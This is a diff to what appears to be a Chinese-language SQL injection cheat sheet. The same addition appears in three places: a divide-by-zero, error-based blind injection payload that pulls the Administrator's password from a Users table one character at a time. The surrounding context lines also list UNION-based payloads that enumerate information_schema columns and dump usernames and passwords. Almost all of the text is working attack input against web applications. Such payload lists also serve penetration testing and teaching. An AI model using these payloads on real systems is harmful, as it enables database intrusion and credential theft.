@@ -97,7 +97,8 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 // 实例
 '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
 '+UNION+SELECT+username,password+FROM+users--
-
+// 触发除零错误，一次测试一个字符来检索数据
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 ```
 
 ### 布尔条件错误
@@ -153,6 +154,8 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 // 实例
 '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
 '+UNION+SELECT+username,password+FROM+users--
+// 触发除零错误，一次测试一个字符来检索数据
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 ```
 
 ### 布尔条件错误
@@ -213,6 +216,8 @@ SELECT * FROM information_schema.columns WHERE table_name = '表名'
 // 实例
 '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
 '+UNION+SELECT+username,password+FROM+users--
+// 触发除零错误，一次测试一个字符来检索数据
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 ```
 
 ### 布尔条件错误
